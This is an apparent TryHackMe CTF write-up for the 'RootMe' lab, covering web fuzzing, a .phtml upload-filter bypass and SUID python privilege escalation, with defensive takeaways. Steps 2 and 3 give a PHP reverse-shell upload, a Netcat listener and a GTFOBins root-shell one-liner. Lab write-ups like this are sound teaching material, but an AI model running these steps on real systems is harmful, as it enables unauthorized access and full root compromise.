---
title: "TryHackMe: RootMe"
symbol: "Rm"
category: "Machines"
readTime: 2
tldr: "Finding a hidden upload panel, bypassing extension filters with .phtml, and escalating to root via SUID python."
red: "Fuzz web directories to find hidden panels, upload a PHP webshell using .phtml, and abuse SUID python for root."
blue: "Restrict uploaded extensions on the server, disable script execution in upload paths, and audit SUID binaries."
next: "kenobi"
---

### Machine Overview
RootMe is a popular beginner CTF machine on TryHackMe focused on web enumeration, file upload filter bypasses, and Linux SUID privilege escalation.

### Step 1: Web Directory Fuzzing
An Nmap scan reveals two open ports:
- Port 22 (SSH)
- Port 80 (HTTP Apache 2.4.29)

Browsing to port 80 shows a simple landing page. To find hidden administrative routes, we run Gobuster:
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```
Gobuster reveals two interesting directories:
- `/panel/`: A file upload page.
- `/uploads/`: The public directory where uploaded files are stored.

### Step 2: Bypassing the File Upload Filter
Attempting to upload a standard PHP reverse shell (`shell.php`) triggers an error: "PHP is not allowed".

The filter only checks the literal `.php` extension. By renaming the file to `.phtml` (an alternative extension that Apache executes as PHP):
```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
```
The server accepts `shell.phtml`. We start a Netcat listener (`nc -lvnp 1234`) and navigate to `http://<target_ip>/uploads/shell.phtml`. The reverse shell connects back immediately as user `www-data`.

### Step 3: SUID Privilege Escalation
Once on the target machine, we search for binaries with the SUID bit enabled:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
Among standard binaries, we find an unusual entry: `/usr/bin/python`.

Because Python runs with root permissions, we reference GTFOBins and execute:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
The `-p` flag preserves root privileges, dropping directly into a root shell (`whoami` &rarr; `root`).

### Key takeaway
Never rely on client-side or blacklist-based extension checks. Furthermore, never grant SUID privileges to script interpreters or general-purpose binaries.
